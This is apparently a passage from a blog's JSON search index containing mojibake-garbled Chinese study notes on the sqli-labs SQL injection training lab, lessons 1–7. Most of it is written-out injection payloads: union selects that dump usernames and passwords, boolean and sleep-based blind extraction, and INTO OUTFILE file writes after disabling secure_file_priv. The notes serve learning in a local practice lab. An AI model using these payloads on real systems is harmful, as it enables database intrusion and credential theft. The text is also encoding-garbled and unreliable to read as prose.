1?id&#x3D;0&#39;)) or 1&#x3D;1--+; è¿”å›æ­£å¸¸ã€‚ B1.æ•°æ®åº“ä¸­å¯¼å‡ºæ–‡ä»¶é‡åˆ°é—®é¢˜ï¼šè¾“å…¥è¯­å¥â€”â€” 1?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;--+ åœ¨æŒ‡å®šç›®å½•ä¸‹æœªç”Ÿæˆç›¸åº”åä¸ºâ€œ1â€çš„æ–‡ä»¶ ç”±å‰äººæŒ‡ç‚¹ï¼šmysqlæœ€åˆå¯¹æ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºæœ‰é™åˆ¶ï¼Œå› æ­¤åº”å½“å…ˆå–æ¶ˆè¯¥é™åˆ¶ åœ¨mysqlæ•°æ®åº“ä¸­æ‰§è¡Œè¯­å¥â€”â€” 1show variables like &quot;secure_file_priv&quot;; å‘ç°æœ¬åœ°valueçš„å€¼ä¸ºNULLã€‚NULLè¡¨ç¤ºç¦æ­¢ã€‚å³ç¦æ­¢å°†äº§ç”Ÿçš„æ–‡ä»¶å¯¼å…¥mysqlç›®å½•ä¸‹ï¼ˆæ³¨ï¼šå¦‚æœè¿™é‡Œvalueå€¼æœ‰æ–‡ä»¶å¤¹ç›®å½•ï¼Œåˆ™è¡¨ç¤ºåªå…è®¸è¯¥ç›®å½•ä¸‹æ–‡ä»¶ã€‚å¦‚æœä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºä¸é™åˆ¶ç›®å½•ã€‚ï¼‰ æ—¢ç„¶é—®é¢˜æ‰¾åˆ°äº†ï¼Œé‚£å°±è§£å†³å®ƒâ€”â€”å»æ‰å¯¼å…¥ç›®å½•çš„é™åˆ¶ï¼šåœ¨mysqlé…ç½®æ–‡ä»¶my.iniä¸­åŠ å…¥è¯­å¥â€”â€” 1secure_file_priv &#x3D; ç„¶åé‡å¯mysqlï¼Œåœ¨æ‰§è¡Œä¸Šè¿°è¯­å¥åˆ™åœ¨æŒ‡å®šç›®å½•ä¸‹æ‰¾åˆ°æŒ‡å®šæ–‡ä»¶ã€‚ ç”±äºæˆ‘ä»¬åˆšåˆšæ²¡æœ‰è§„å®šäº§ç”Ÿçš„æ–‡ä»¶å¯¼å‡ºåˆ°å“ªé‡Œï¼Œå› æ­¤åœ¨å¯¼å‡ºæ–‡ä»¶æ—¶è¦è¡¨æ˜ç›®å½•åœ°å€ã€‚ åœ¨mysqlæ•°æ®åº“ä¸­è¾“å…¥è¯­å¥â€”â€” 1select *from users into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;; åˆ™å¯åœ¨æŒ‡å®šç›®å½•ä¸‹æ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°usersçš„å…¨éƒ¨å†…å®¹ã€‚ï¼ˆæ³¨æ–‡ä»¶ä¸€å®šè¦æ˜¯å¯¼å‡ºç›®å½•ä¸‹ä¸å­˜åœ¨çš„æ–°åå­—æ–‡ä»¶ï¼‰ B2.åœ¨B1çš„æ“ä½œä¹‹åå°±å¯ä»¥å¼€å§‹å¸¸è§„æµç¨‹ï¼š1.çˆ†åº“ 1?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;--+ ç‚¹å¼€1.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«æ•°æ®åº“å 2.çˆ†è¡¨ 1?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\2.txt&quot;--+ ç‚¹å¼€2.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«åº“åä¸ºsecurityä¸‹çš„æ‰€æœ‰è¡¨çš„è¡¨å 3.çˆ†åˆ— 1?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\3.txt&quot;--+ ç‚¹å¼€3.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«åº“åä¸ºsecurityä¸‹è¡¨åä¸ºusesrçš„åˆ—çš„æ‰€æœ‰åˆ—å 4.çˆ†å€¼ 1?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\4.txt&quot;--+ ç‚¹å¼€4.txtçš„æ–‡ä»¶å¯ä»¥å‘ç°é‡Œé¢åŒ…å«åº“åä¸ºsecurityä¸‹è¡¨åä¸ºusesrçš„æ‰€æœ‰æ•°æ®å€¼ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"MySQL","date":"2020-11-28T14:35:29.000Z","path":"2020/11/28/blog f/","text":"ä¸€.åŸºæœ¬çš„ä½¿ç”¨ 1.æŸ¥çœ‹æœ‰å“ªäº›æ•°æ®åº“ï¼šshow databaseï¼› 2.è°ƒç”¨securityæ•°æ®åº“ï¼šuse securityï¼› 3.æŸ¥çœ‹è¢«è°ƒç”¨çš„æ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨åï¼šshow tablesï¼› 4.æŸ¥çœ‹è¡¨çš„ç»“æ„ï¼Œå¦‚ï¼šdesc emailï¼› 5.æŸ¥çœ‹è¡¨çš„å†…å®¹ï¼šselect *form è¡¨åï¼›","tags":[{"name":"mysqlæ•°æ®åº“çš„ä½¿ç”¨","slug":"mysqlæ•°æ®åº“çš„ä½¿ç”¨","permalink":"http://example.com/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"}]},{"title":"lesson5&lesson6","date":"2020-11-20T08:15:38.000Z","path":"2020/11/20/blog e/","text":"lesson5A.sqlå¸ƒå°”ç›²æ³¨ä¸€.å¯»æ‰¾æ³¨å…¥ç‚¹è¾“å…¥?id=1è¿”å›æ­£å¸¸ï¼›è¾“å…¥?id=1â€™è¿”å›æŠ¥é”™ï¼›ç¡®è®¤æ³¨å…¥ç‚¹ï¼šè¾“å…¥?id=0â€™ or 1=1â€“+ï¼Œè¿”å›æ­£å¸¸ï¼Œè¯´æ˜æ­¤é¢˜â€˜ä¸ºæ³¨å…¥ç‚¹ã€‚ äºŒ.çˆ†åº“ï¼ˆé‡åˆ°æŒ«æŠ˜ï¼‰é€šè¿‡è¾“å…¥ä¹‹å‰å­¦è¿‡çš„çˆ†åº“è¯­å¥å‘ç°å¾—åˆ°çš„è¿”å›å€¼åªæœ‰you are inï¼Œæ— æ³•æ˜¾ç¤ºå‡ºæ•°æ®åº“åã€‚æ‰€ä»¥è¦å­¦ä¹ ä¸€ç§æ–°çš„æ³¨å…¥æ–¹æ³•ï¼šç›²æ³¨ã€‚ A.å‡½æ•°leftï¼ˆï¼‰å‡½æ•°ï¼šleftï¼ˆaï¼Œbï¼‰å³ä»å·¦ä¾§æˆªå–å­—ç¬¦ä¸²açš„å‰bä½ï¼Œä¾‹å¦‚leftï¼ˆdatabaseï¼ˆï¼‰ï¼Œ1ï¼‰ï¼Œdatabaseï¼ˆï¼‰æ˜¾ç¤ºæ•°æ®åº“åç§°ï¼ˆä¸ºå­—ç¬¦ä¸²ï¼‰ï¼Œå³è¯‘ä¸ºæˆªå–æ•°æ®åº“åç§°çš„ç¬¬ä¸€ä½æ•°ã€‚substrï¼ˆï¼‰å‡½æ•°ï¼šsubstr(a,b,c)ä» b ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² a çš„ c é•¿åº¦ï¼Œå–åˆ°çš„å€¼åŒ…æ‹¬bä½ç½®å¯¹åº”å­—ç¬¦æœ¬èº«ã€‚åŒmidï¼ˆï¼‰å‡½æ•°ã€‚ascii()å‡½æ•°ï¼šå°†æŸä¸ªå­—ç¬¦è½¬æ¢ ä¸º ascii å€¼ ã€‚åŒordï¼ˆï¼‰å‡½æ•°ã€‚lengthï¼ˆï¼‰å‡½æ•°ï¼šè·å–æ•°æ®åº“é•¿åº¦ã€‚å¦‚?id=1â€™and length(database())=nâ€“+å½“nçš„å€¼ç­‰äºæ•°æ®åº“åç§°å­—ç¬¦ä¸²é•¿åº¦æ—¶ï¼Œè¿”å›æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™B.çŒœæµ‹æ•°æ®åº“åç§°çŒœæµ‹æ•°æ®åº“åç§°ç¬¬ä¸€ä½â€“è¾“å…¥è¯­å¥ï¼š?id=1â€˜and left(database(),1)&gt;â€™aâ€™â€“+ ï¼Œè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°é¦–å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“é¦–å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚çŒœæµ‹æ•°æ®åº“åç§°ç¬¬äºŒä½â€“è¾“å…¥è¯­å¥?id=1â€™and left(database(),2)&gt;â€™saâ€™â€“+ ,è‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯å¤§äºaï¼Œåä¹‹åˆ™è¯´æ˜æ•°æ®åº“åç§°ç¬¬äºŒä½å­—æ¯ä¸ºaã€‚ç„¶åä½¿ç”¨äºŒåˆ†æ³•å°†aæ¢æˆmï¼Œç»§ç»­è§‚å¯Ÿè¿”å›ç»“æœï¼Œé‡å¤ä½¿ç”¨äºŒåˆ†æ³•ï¼Œç›´åˆ°å¯ä»¥ç¡®å®šå‡ºå­—æ¯ä¸ºæ­¢ã€‚çŒœæµ‹åç»­å­—æ¯å€¼åŒä¸Šï¼Œé‡å¤ä½¿ç”¨è¯­å¥å³å¯è·å¾—æ•°æ®åº“åç§°â€œsecurityâ€ã€‚ä¸‰.çˆ†è¡¨ï¼é¦–å…ˆè¦å…ˆäº†è§£ä¸€ä¸‹asciiç è¡¨ï¼Œç”¨äºæ„å»ºæ³¨å…¥è¯­å¥ã€‚a.çˆ†ç¬¬ä¸€ä¸ªè¡¨ï¼šè¾“å…¥è¯­å¥?id=1â€˜and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1ï¼‰,1ï¼Œ1)) &gt;65 â€“+ ã€‚æ³¨ï¼š1.limit 0,1çš„æ„æ€æ˜¯ä»ç¬¬1è¡Œå¼€å§‹ï¼Œè·å–è¿™ä¸€è¡Œçš„è¿”å›å€¼ã€‚è€Œæ­¤å¤„çš„æ„æ€æ˜¯è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚{substr((select table_name from information_schema.tables where table_schema=database() limit 0,1ï¼‰}å³è·å–æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚å…¶åœ¨substrï¼ˆaï¼Œbï¼Œcï¼‰ä¸­å……å½“açš„å€¼ã€‚2.æ•´ä¸ªè¾“å…¥è¯­å¥çš„æ„å›¾æ˜¯ï¼šé€šè¿‡asciiç è½¬æ¢ï¼ŒçŒœæµ‹æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨è¡¨åçš„é¦–å­—æ¯ã€‚ä¸ºäº†çŒœæµ‹å¾—åˆ°è¡¨åç¬¬äºŒä½å­—æ¯ï¼Œä»…éœ€å°†substrï¼ˆa,b,c)ä¸­çš„1æ”¹ä¸º2ã€‚åç»­å­—æ¯ä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—æ•°æ®åº“ç¬¬ä¸€ä¸ªè¡¨çš„è¡¨åã€‚3.çŒœæµ‹çš„è¿‡ç¨‹åŒæ ·é‡‡ç”¨äºŒåˆ†æ³•ã€‚b.çˆ†ç¬¬äºŒä¸ªè¡¨ï¼šä»…éœ€æŠŠaä¸­è¾“å…¥è¯­å¥çš„limit 0,1æ”¹æˆlimit 1,1ã€‚å…¶ä½™ç…§éƒ¨å°±æ¬ã€‚å››.çˆ†åˆ—å¦‚çŒœæµ‹usersè¡¨ä¸­æ˜¯å¦å­˜åœ¨usernameåˆ—ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.columns where table_name=â€™usersâ€™ and column_name regexp â€˜^usernameâ€™ limit 0,1)â€“+è¿”å›æ­£å¸¸ï¼Œåˆ™è¯´æ˜usersè¡¨ä¸­å­˜åœ¨usernameåˆ—ã€‚è¯æ˜å…¶ä»–åˆ—æ˜¯å¦å­˜åœ¨ä¹Ÿå¯ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œä»…éœ€å˜æ¢åˆ—åã€‚äº”.çˆ†å€¼å¦‚è¾“å…¥è¯­å¥?id=1â€™ and ord mid((select ifunll(cast(username as char),0x20)form security.users order by id limit 0,1),1,1))=68â€“+ ã€‚æ„æ€æ˜¯è·å–usernameåˆ—ä¸­ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å¯¹åº”asciiç çš„æ•°å€¼ä¸68æ¯”è¾ƒï¼Œä»¥ç¡®è®¤å…¶å€¼ã€‚å…¶ä½™æ“ä½œéƒ½æ˜¯æŒ‰éƒ¨å°±æ¬ä¸Šé¢ã€‚B.*sqlæŠ¥é”™æ³¨å…¥C.*sqlå»¶æ—¶æ³¨å…¥é¢„å¤‡ï¼šæ—¶é—´ç›²æ³¨å¤šä¸ifï¼ˆexpr1,expr2,expr3ï¼‰ç»“åˆä½¿ç”¨ï¼Œæ­¤ifè¯­å¥çš„ç”¨æ³•æ˜¯ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™ifï¼ˆï¼‰çš„è¿”å›å€¼ä¸ºexpr2ï¼›å¦åˆ™è¿”å›expr3.å…³äºsleepå‡½æ•°ï¼šhttps://blog.csdn.net/zyz511919766/article/details/42241211 1.åˆ©ç”¨sleepï¼ˆï¼‰å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼š?id=1â€™and If(ascii(substr(database(),1,1))=115,1,sleep(5))â€“+å½“é”™è¯¯çš„æ—¶å€™ç½‘é¡µä¼šæœ‰äº”ç§’çš„å»¶è¿Ÿã€‚æ€»ç»“ï¼šåœ¨æœ¬é¢˜å­¦ä¹ æ—¶å­¦ä¹ äº†sqlç›²æ³¨ä¹‹æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»æ³•è·å¾—è¡¨åæˆ–åˆ—åã€‚1.å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªè¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-zä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^[a-z]â€™ limit 0,1)â€“+2.å¦‚åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯a-nä¸­çš„å­—ç¬¦ï¼Œè¾“å…¥è¯­å¥ï¼š?id=1â€™ and 1=(select 1 from information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^[a-n]â€™ limit 0,1)â€“+3.å¦‚ç¡®å®šä¸€ä¸ªæ•°æ˜¯nï¼š?id=1â€™ and 1=(select 1 from information_schema.tables where table_name=â€™securityâ€™ and table_name regexp â€˜^nâ€™ limit 0,1)â€“+4.è‡ªå·±åœ¨åç»­çš„åšé¢˜æ—¶å‘ç°å¸ƒå°”ç›²æ³¨æ³•ç”¨èµ·æ¥å¾ˆé¸¡è‚‹ï¼Œå› ä¸ºå¦‚æœé¡µé¢ä¸€ç›´å›æ˜¾ç»™ä½ you are iné‚£ä¹ˆä½ å°±æ— æ³•ç¡®å®šæ³¨å…¥è¯­å¥æ˜¯å¦æ­£ç¡®ã€‚lesson6ç”±é¢˜ç›®å¯çŸ¥ï¼šè¿™æ˜¯åŒæ³¨å…¥åŒå¼•å·å‹ã€‚æˆ‘ä»¬é€šè¿‡æŸ¥æ‰¾æºä»£ç ï¼š 12$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; æ˜“çŸ¥æœ¬é¢˜çš„æ³¨å…¥ç‚¹ä»…éœ€æŠŠlesson5çš„æ³¨å…¥ç‚¹ â€˜ æ”¹ä¸º â€œ å³å¯ï¼Œå…¶ä½™æŒ‰éƒ¨å°±ç­ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson2ï¼Œlesson3ï¼Œlesson4","date":"2020-11-16T14:04:05.000Z","path":"2020/11/16/blog d/","text":"ä¸€.æ‰¾æ³¨å…¥ç‚¹ç”±é¢˜ç›®æç¤ºï¼šæ³¨å…¥ç‚¹ä¸ºæ•´æ•°ã€‚ è¯•æ¢ï¼šè¾“å…¥?id=1è¿”å›æ­£å¸¸ï¼›è¾“å…¥?id=0è¿”å›å¼‚å¸¸ï¼›ä¸”è¾“å…¥?id=0 or 1=1â€“+å¾—åˆ°çš„è¿”å›å€¼æ­£ç¡®ã€‚æ•…è¯¥å¤„å­˜åœ¨sqlæ³¨å…¥ç‚¹ã€‚ äºŒ.åˆ¤æ–­å­—æ®µæ•° è¾“å…¥?id=1 order by nâ€“+ç›´åˆ°è¾“å…¥n=4æ—¶è¿”å›é”™è¯¯ã€‚æ•…æ•°æ®åº“ä¸­å­˜åœ¨3ä¸ªå­—æ®µã€‚ ä¸‰.çˆ†å¼€æ•°æ®åº“ï¼šå¾—åˆ°æ•°æ®åº“å è¾“å…¥?id=0 uion select 1,2,database()â€“+è¯­å¥ å››.çˆ†å¼€æ•°æ®è¡¨ï¼šå¾—åˆ°æ•°æ®è¡¨å è¾“å…¥?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() â€“+è¯­å¥ã€‚ æ³¨ï¼štable_schema=database()èµ‹å€¼è¯­å¥ï¼Œå³åˆ—å‡ºæ•°æ®åº“ä¸­çš„è¡¨å äº”.çˆ†å¼€æ•°æ®åˆ—ï¼šå¾—åˆ°æ•°æ®åˆ—å è¾“å…¥?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=â€™usersâ€™ â€“+è¯­å¥ å…­.çˆ†å¼€æ•°æ®å€¼ è¾“å…¥?id=0 union select 1,group_concat(username,0x3a,password),3 from usersâ€“+è¯­å¥ã€‚ ä¸ƒ.æ€»ç»“ï¼šlesson1â€”4çš„çˆ†åº“æ–¹æ³•åŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰åœ¨æ³¨å…¥ç‚¹ä¸Šç•¥æœ‰ä¸åŒã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson1","date":"2020-11-14T13:07:05.000Z","path":"2020/11/14/blog c/","text":"å‰è¨€ï¼šè¿™æ˜¯ç¬¬äºŒæ¬¡å†™lesson1çš„blogï¼Œä¸‡äº‹å¼€å¤´éš¾ã€‚ ä¸€.å¯»æ‰¾sqlæ³¨å…¥ç‚¹ æ ¹æ®æ ‡é¢˜æç¤ºè¯¥sqlæ³¨å…¥ç‚¹ä¸ºå•å¼•å·ã€‚è¾“å…¥?id=1â€™è¿”å›å€¼é”™è¯¯ï¼›è¾“å…¥?id=1è¿”å›å€¼æ­£å¸¸ã€‚æ•…å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ æ³¨ï¼š1.ï¼ˆè‡ªå·±çš„æ‘¸ç´¢ï¼‰ï¼šå‘ç°è¾“å…¥id=éæ­£æ•´æ•°å¦‚ï¼ˆ?id=-1ï¼‰æ—¶ï¼Œé¡µé¢è¿”å›ä¸ºç©ºã€‚è¿™æ˜¯å› ä¸ºè¿™äº›æ•°å€¼ä¸åœ¨æ•°æ®åº“èŒƒå›´ä¹‹å†…ï¼Œæ•…è¿”å›ä¸ºç©ºã€‚ 2.ä¸æ˜¯æ‰€æœ‰å¼•èµ·æŠ¥é”™çš„ç‚¹éƒ½æ˜¯æ³¨å…¥ç‚¹ï¼Œä¹Ÿå¯èƒ½æ˜¯ç”±äºå•çº¯çš„è¯­æ³•é”™è¯¯å¯¼è‡´äº†é¡µé¢æŠ¥é”™ã€‚è€Œå½“å­˜åœ¨ä¸€ä¸ªçœŸæ­£çš„æ³¨å…¥ç‚¹æ—¶ï¼Œè¾“å…¥?id=0+æ³¨å…¥ç‚¹+or 1=1â€“+è¯­å¥è¿”å›å€¼æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™ã€‚ äºŒ.æŸ¥è¯¢å­—æ®µæ•° åˆ©ç”¨order byè¯­å¥ã€‚?id=1%27%20order%20by%20nâ€“+ï¼ˆnä¸ºæ­£æ•´æ•°ï¼Œä¸æ–­æ”¹å˜nçš„å€¼é€šè¿‡è§‚å¯Ÿè¿”å›çŠ¶æ€ç¡®å®šå­—æ®µæ•°ï¼‰å¦‚ï¼š è¾“å…¥?id=1%27%20order%20by%201â€“+ï¼Œè¿”å›æ­£å¸¸ã€‚ è¾“å…¥?id=1%27%20order%20by%204â€“+ï¼Œè¿”å›å¼‚å¸¸ã€‚ å½“è¾“å…¥åˆ°ç¬¬n-1ä¸ªæ­£å¸¸ï¼Œç¬¬nä¸ªä¸æ­£å¸¸æ—¶ï¼Œè¯´æ˜æ‹¥æœ‰n-1ä¸ªå­—æ®µæ•°ã€‚ æ³¨ï¼šå­—æ®µæ•°å°±æ˜¯sqlæ•°æ®åº“ä¸­å­˜åœ¨å˜é‡æ•°çš„ä¸ªæ•°ã€‚ ä¸‰.union selectçœ‹è¿”å›å€¼ 1.åˆ©ç”¨union selectè¯­å¥æŸ¥çœ‹å­—æ®µæ•°è¿”å›å€¼ã€‚?id=-1%27union%20select%201,2,3â€“+ã€‚ åªæœ‰2,3ä»£è¡¨çš„å›æ˜¾ä½èƒ½è¢«è§‚å¯Ÿåˆ°ï¼Œå³ç”¨æˆ·ä»æµè§ˆå™¨ä¸Šåé¦ˆçœ‹è§çš„åªæœ‰2,3å›æ˜¾ä½ã€‚ 2.åˆ©ç”¨union selectè¯­å¥æŸ¥çœ‹æ•°æ®åº“è¿”å›å€¼ã€‚ è¾“å…¥?id=-1%27union%20select%201,database(),2â€“+. ç”±æ­¤å¯çŸ¥ï¼šdatabaseçš„åç§°ä¸ºsecurityã€‚ æ³¨æ„ä½¿ç”¨union select å››.æŸ¥è¡¨ 1.è¾“å…¥?id=-1â€™ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=â€˜sercurityâ€™â€“+å³å¯æŸ¥è·åœ¨sercurityæ•°æ®åº“ä¸­çš„è¡¨å•åã€‚ æ³¨ï¼šå¯¹äºç†è§£è¯¥ä»£ç ï¼šgroup_concat(table_name) ï¼šgroup_concatå‡½æ•°æ˜¯å…¸å‹çš„å­—ç¬¦ä¸²è¿æ¥å‡½æ•°ï¼›from information_schema.tablesï¼šæ¥è‡ªä¿¡æ¯å›¾è¡¨æ•°æ®åº“ä¸­çš„è¡¨å•ã€‚where table_schema=â€˜sercurityâ€™å…¶ä¸­whereä¸ºé™åˆ¶è¯ï¼Œwhere table_schema=â€˜sercurityâ€™:å¯»æ‰¾èŒƒå›´åœ¨æ•°æ®åº“åä¸ºsercurityä¸­ã€‚ ps:ä¸ºäº†æ–¹ä¾¿åœ¨é¡µé¢ä¸Šçœ‹åˆ°è‡ªå·±åœ¨urlé‡Œè¾“å…¥çš„å†…å®¹å¯ä»¥åœ¨indexæ–‡ä»¶é‡ŒåŠ ä¸€å¥echo &quot; $sql&lt; br &gt;&quot;; äº”.æŸ¥å­—æ®µåä»¥åŠå­—æ®µæ•°å€¼ 1.è¾“å…¥?id=-1â€™ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()â€“+å¯æŸ¥å¾—å­—æ®µåã€‚ 2.è¾“å…¥?id=-1â€™union select 1,2,group_concat(username,0x3a,password) from usersâ€“+å¯æŸ¥å¾—æ¯ä¸ªç”¨æˆ·å¯¹åº”çš„å¯†ç ï¼ˆ0x3aæ˜¯å­—ç¬¦å†’å·ï¼Œï¼šâ€™å¯¹åº”16è¿›åˆ¶çš„ASCLLç ï¼‰","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"sqlæ³¨å…¥åŸºæœ¬çŸ¥è¯†lesson1","date":"2020-11-10T13:00:12.000Z","path":"2020/11/10/blog b/","text":"ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•1.åŸºç¡€ä¸­çš„åŸºç¡€ï¼šgetå•å¼•å·åˆ¤æ–­åœ¨åœ°å€æ ç½‘å€ååŠ **?id=1ï¼Œæ˜¾ç¤ºæ­£å¸¸ï¼›åŠ ?id=1â€™ï¼Œæ˜¾ç¤ºé”™è¯¯ã€‚åˆ™è¯´æ˜å­˜åœ¨sqlæ³¨å…¥ç‚¹ã€‚ä¸”â€˜**çš„urlç¼–ç æ˜¯%27. 2.get andåˆ¤æ–­è¾“å…¥?id=-1 and 1=1 æ­£å¸¸ï¼› è¾“å…¥?id=-1&#39;and 1=2 æŠ¥é”™ï¼›å­˜åœ¨sqlã€‚ æ€»ç»“ï¼šåœ¨è¯·æ±‚å­—ç¬¦ä¸²æˆ–idå‚æ•°ååŠ â€™ï¼Œæ˜¯ä¸€ç§åŸºæœ¬æ£€æµ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•ã€‚ 3.Orã€xoråˆ¤æ–­åŒget andåˆ¤æ–­ 4.sqlè¿ç®—ç¬¦åˆ¤æ–­5.é€šè¿‡sleepå‡½æ•°æ¼”ç¤ºæ˜¾ç¤ºçš„å½¢å¼è¿›è¡Œåˆ¤æ–­6.æœåŠ¡ç«¯è¿”å›é”™è¯¯å½¢å¼7.äº†è§£postã€getã€ç¼–ç # æ˜¯sqlè¯­å¥ä¸­çš„æ³¨é‡Šç¬¦ï¼› + åœ¨httpè¯·æ±‚ä¸­è¡¨ç¤ºç©ºæ ¼ï¼› -- åé¢çš„è¯­å¥ç›¸å½“äºè¢«æ³¨é‡Šæ‰,ä¸æ‰§è¡Œåé¢çš„sqlè¯­å¥ï¼› --+ä»£è¡¨é—­åˆsqlæŸ¥è¯¢è¯­å¥ï¼Œå¦‚æœæ²¡åŠ ï¼Œæ— æ³•å½¢æˆæœ‰æ•ˆçš„mysqlè¯­å¥ã€‚ åœ¨postå‚æ•°ä¸­ï¼Œè¦åŠ ç©ºæ ¼ç¬¦æ—¶ï¼Œç›´æ¥è¾“å…¥ç©ºæ ¼ç¬¦å³å¯ï¼›ç”¨+ä¼šè¢«httpè¯·æ±‚è½¬ä¹‰ä¸º%23ç¼–ç ï¼› åœ¨getè¯·æ±‚ä¸­ï¼Œå¦‚æœæƒ³ä½¿ç”¨ç©ºæ ¼ï¼Œéœ€è¦ç”¨ç©ºæ ¼ç¬¦ç¼–ç %20æ¥æ›¿ä»£ï¼Œä¸ç„¶ä¼šè¯·æ±‚æŠ¥é”™ï¼›å¦‚æœä½¿ç”¨#ï¼Œåˆ™#åé¢çš„å‚æ•°ä¸ä¼šæäº¤åˆ°æœåŠ¡å™¨ï¼Œä½†å¦‚æœä½¿ç”¨ç¼–ç %23å³å¯æäº¤åˆ°æœåŠ¡å™¨ã€‚ å¸¸è§çš„urlç¼–ç ï¼šç©ºæ ¼ ï¼š%20 ï¼› + ï¼š%2Bï¼› &lt; ï¼š%3Cï¼› &gt; ï¼š%3E â€˜ : %27 #ï¼š %23 8.sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°1.order byï¼šè¯¥å‡½æ•°å¯¹ç»“æœé›†è¿›è¡Œæ’åºï¼Œç”¨äºçŒœæµ‹å­—æ®µæ•°ã€‚ä¾‹å¦‚è¾“å…¥?id=1â€™ order by 3 â€“+æ˜¾ç¤ºæ­£å¸¸ï¼›è¾“å…¥?id=1â€™ order by 4 â€“+æ˜¾ç¤ºé”™è¯¯ã€‚æ•…å¾—å‡ºåœ¨?id=1æŸ¥çœ‹çš„è¡¨æœ‰3ä¸ªå­—æ®µ äºŒ.ç¡®è®¤å­—æ®µæ•°ç¡®è®¤å­—æ®µæ•°å¯ä»¥ä½¿ç”¨order byè¯­å¥ï¼Œä¾‹å¦‚ï¼š?id=1â€™ order by 4 %23 æ—¶æŠ¥é”™!","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"MYSQL","date":"2020-11-09T13:29:45.000Z","path":"2020/11/09/MYSQLæ•°æ®åº“/","text":"1.MYSQLæ³¨å…¥åœ¨çº¿é¶åœºhttps://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1 ä¸ªäººç”¨phpstudyæ­å»ºæœ¬åœ°é¶åœºã€‚ 2.æ›´æ”¹rootå¯†ç 